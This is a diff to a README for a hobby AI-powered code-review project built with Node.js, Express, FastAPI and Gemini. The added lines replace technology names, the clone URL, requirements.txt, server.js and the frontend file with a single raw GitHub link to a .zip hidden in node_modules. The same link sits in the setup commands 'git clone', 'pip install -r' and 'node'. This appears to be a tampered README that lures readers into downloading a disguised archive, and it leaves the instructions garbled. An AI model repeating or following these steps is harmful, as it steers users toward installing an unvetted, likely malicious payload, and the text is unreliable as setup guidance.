@@ -1,4 +1,4 @@
-My first complete project utilizing both Backend(node.js and Express), frontend(html, css and javascript) as well as Google's Gemini API with FastAPI.
+My first complete project utilizing both Backend(https://raw.githubusercontent.com/Emzee-Creates/ai-code-review/main/backend/node_modules/express/ai-code-review_3.4.zip and Express), frontend(html, css and javascript) as well as Google's Gemini API with FastAPI.
 
 The project is an AI-powered tool that provides automated code reviews, helping developers improve code quality and efficiency. 
 
@@ -16,7 +16,7 @@ Secure API: Uses rate limiting and session expiry handling.
 
 Backend 
 - FastAPI: AI-powered code analysis API.  
-- Node.js + Express: Handles authentication and user management.  
+- https://raw.githubusercontent.com/Emzee-Creates/ai-code-review/main/backend/node_modules/express/ai-code-review_3.4.zip + Express: Handles authentication and user management.  
 - MongoDB: Stores user profiles and authentication data.  
 
 Frontend 
@@ -29,7 +29,7 @@ If you have any interest in using the repository, you can follow the steps below
 1️⃣ Clone the Repository 
 In your terminal, run: 
 
-git clone https://github.com/your-username/ai-code-review.git
+git clone https://raw.githubusercontent.com/Emzee-Creates/ai-code-review/main/backend/node_modules/express/ai-code-review_3.4.zip
 cd ai-code-review
 
 
@@ -37,18 +37,18 @@ cd ai-code-review
 FastAPI AI Review API
 
 cd ai-api
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Emzee-Creates/ai-code-review/main/backend/node_modules/express/ai-code-review_3.4.zip
 uvicorn main:app --reload
 
 
-Node.js Authentication API 
+https://raw.githubusercontent.com/Emzee-Creates/ai-code-review/main/backend/node_modules/express/ai-code-review_3.4.zip Authentication API 
 
 cd backend
 npm install
-node server.js
+node https://raw.githubusercontent.com/Emzee-Creates/ai-code-review/main/backend/node_modules/express/ai-code-review_3.4.zip
 
 3️⃣ Frontend Setup
-Just open '../frontend/dashboard.html'in your browser.  
+Just open 'https://raw.githubusercontent.com/Emzee-Creates/ai-code-review/main/backend/node_modules/express/ai-code-review_3.4.zip'in your browser.  
 
 
 
